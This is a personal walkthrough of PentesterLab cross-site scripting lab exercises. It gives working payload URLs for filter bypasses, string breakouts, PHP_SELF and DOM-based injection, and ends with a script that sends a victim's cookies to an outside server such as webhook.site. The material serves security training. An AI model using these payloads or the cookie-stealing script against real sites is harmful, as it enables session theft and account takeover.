# Pentesterlab XSS

> Saikat Karmakar | AUG 28 : 2021

---

## XSS

-	If you keep playing around, you will realise that if you use ``Pentest<script>erLab`` for payload, you can see PentesterLab in the page. You can probably use that to get \<script> in the page, and your alert box to pop up.
```
http://ptl-80c064c0-9b862210.libcurl.so/index.php?name=<script <Script>>alert('1')</</scriPT>script>
```

-	n this example, the developer decided to completely block the word script: if the request matches script, the execution stops.

Fortunately (or unfortunately depending on what side you are on), there are a lot of ways to get JavaScript to be run (non-exhaustive list):

    with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...
    with the <a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).
    with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.
    with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...

-	Using JavaScript's ``eval`` and ``String.fromCharCode()``, you should be able to get an alert box without using the word alert directly. String.fromCharCode() will decode an integer (decimal value) to the corresponding character.

You can write a small tool to transform your payload to this format using your favorite scripting language.

```
http://ptl-0d782720-dc40d7b9.libcurl.so/index.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,53,98,53,50,101,99,57,55,45,100,53,101,57,45,52,57,98,100,45,97,57,100,98,45,49,97,51,49,49,102,100,57,101,48,56,53,39,41))</script>
```

-   Here, the source code of the HTML page is a bit different. If you read it, you will see that the value you are sending is echoed back inside JavaScript code. To get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing JavaScript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = ") to close it correctly.

```
http://ptl-ec36b543-866c4068.libcurl.so/index.php?name=jadu"</script><script>alert('5b52ec97-d5e9-49bd-a9db-1a311fd9e085')</script>var $dummy = "
```

-  In PHP web applications, because the well-known function used to HTML-encode characters (``htmlentities``) does not encode single quotes (`'`), unless you told it to do so, using the ``ENT_QUOTES`` flag.

```
http://ptl-ec5e6697-f38141b5.libcurl.so/index.php?name=jadu'; alert(1);//
```

-   Here, the value echoed back in the page is correctly encoded. However, there is still a XSS vulnerability in this page. To build the form, the developer used and trusted PHP_SELF which is the path provided by the user. It's possible to manipulate the path of the application in order to:

    call the current page (however you will get an HTTP 404 page);
    get a XSS payload in the page.

This can be done because the current configuration of the server will call /index.php when any URL matching /index.php/... is accessed. You can simply get your payload inside the page by accessing /index.php/[XSS_PAYLOAD]. Now that you know where to inject your payload, you will need to adapt it to get it to work and get the famous alert box.

Trusting the path provided by users is a common mistake, and it can often be used to trigger XSS, as well as other issues. This is pretty common in pages with forms, and in error pages (404 and 500 pages).


```
http://ptl-a3161ec0-17bbc908.libcurl.so/index.php/jadu"><script>alert(1)</script>
```

-   This example is a DOM-based XSS. This page could actually be completely static and still be vulnerable.

In this example, you will need to read the code of the page to understand what is happening. When the page is rendered, the JavaScript code uses the current URL to retrieve the anchor portion of the URL (#...) and dynamically (on the client side) write it inside the page. This can be used to trigger a XSS vulnerability, if you use the payload as part of the URL.

Since most browsers now encode the fragment, this vulnerable application decodes the fragment using the function decodeURIComponent(...). With old browsers, the exploitation works even if decodeURIComponent(...) is not present.

```
http://ptl-0c6739b0-36755762.libcurl.so/index.php#jadu%22%3E%3Cscript%3Ealert(%225b52ec97-d5e9-49bd-a9db-1a311fd9e085%22)%3C/script%3E
```

-   This exercise is identical to the first one. But this time, you're going to have to retrieve the victim's cookie. To do so, you can:

    Use your own server
    Use webhook.site

To get the cookie, you will use JavaScript. Your JavaScript code will retrieve the victim's cookies with document.cookie. Then you will add the value to a \<img tag to send it to your website (or webhook.site).

Your payload should look like:
```js
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
```
Once the browser renders the JavaScript the img tag should look like:
```js
<img src="[URL]?c=[COOKIE]"/>
```
And it will send the cookies to your website.

**Make sure you don't forget to encode the + in the URL (%2b).**


